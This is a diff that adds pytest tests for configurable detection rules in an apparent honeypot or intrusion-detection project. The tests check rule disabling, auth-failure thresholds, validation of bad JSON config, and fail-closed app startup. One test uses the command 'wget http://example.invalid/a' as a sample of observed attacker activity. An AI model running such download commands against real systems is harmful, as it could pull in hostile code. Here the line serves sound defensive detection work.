@@ -1,7 +1,11 @@
 from datetime import datetime, timezone
 
+import pytest
+
 from aegis_nexus.alerts import AlertStore
+from aegis_nexus.app import create_app
 from aegis_nexus.detection import DETECTION_SCHEMA_VERSION, DetectionEngine
+from aegis_nexus.detection_config import DetectionConfig, DetectionConfigError
 from aegis_nexus.honeytokens import honeytoken_credential
 
 
@@ -208,3 +212,64 @@ def test_honeytoken_rule_requires_both_username_and_secret_fingerprint(monkeypat
 
     assert "honeytoken_reuse" not in {item["rule_id"] for item in DetectionEngine().evaluate(wrong_user)}
     assert "honeytoken_reuse" not in {item["rule_id"] for item in DetectionEngine().evaluate(wrong_secret)}
+
+
+
+def test_detection_config_can_disable_rule_without_changing_source_evidence():
+    config = DetectionConfig.from_json(
+        '{"rules":{"download_attempt":{"enabled":false}}}'
+    )
+    event = _event(command="wget http://example.invalid/a")
+    findings = DetectionEngine(config=config).evaluate(event)
+    assert "download_attempt" not in {item["rule_id"] for item in findings}
+    assert event["observed"]["command"] == "wget http://example.invalid/a"
+
+
+def test_detection_config_applies_validated_temporal_thresholds():
+    config = DetectionConfig.from_json(
+        '{"rules":{"multiple_auth_failures":{"thresholds":{"attempts":3,"window_seconds":120}}}}'
+    )
+    events = [_context_event(f"configured-auth-{i}", i) for i in range(3)]
+    finding = next(
+        item
+        for item in DetectionEngine(config=config).evaluate(events[-1], events)
+        if item["rule_id"] == "multiple_auth_failures"
+    )
+    assert len(finding["evidence"]) == 3
+    assert "3 or more credential attempts" in finding["description"]
+    assert "120 seconds" in finding["description"]
+
+
+@pytest.mark.parametrize(
+    "raw",
+    [
+        '{"rules":{"unknown":{"enabled":false}}}',
+        '{"rules":{"multiple_auth_failures":{"thresholds":{"attempts":1}}}}',
+        '{"rules":{"multiple_auth_failures":{"thresholds":{"attempts":true}}}}',
+        '{"rules":{"multiple_auth_failures":{"thresholds":{"invented":5}}}}',
+        '{"rules":{"download_attempt":{"enabled":"no"}}}',
+    ],
+)
+def test_detection_config_rejects_unknown_or_unsafe_values(raw):
+    with pytest.raises(DetectionConfigError):
+        DetectionConfig.from_json(raw)
+
+
+def test_create_app_fails_closed_on_invalid_detection_configuration(tmp_path):
+    with pytest.raises(DetectionConfigError):
+        create_app({
+            "TESTING": True,
+            "DATABASE_PATH": str(tmp_path / "invalid-detection-config.db"),
+            "DETECTION_RULES_JSON": '{"rules":{"recon_burst":{"thresholds":{"events":0}}}}',
+        })
+
+
+def test_create_app_exposes_configured_detection_engine(tmp_path):
+    app = create_app({
+        "TESTING": True,
+        "DATABASE_PATH": str(tmp_path / "configured-detection.db"),
+        "DETECTION_RULES_JSON": '{"rules":{"rapid_port_sequence":{"enabled":false}}}',
+    })
+    engine = app.extensions["aegis_detection_engine"]
+    assert engine.config.enabled("rapid_port_sequence") is False
+    assert engine.config.threshold("recon_burst", "events") == 15
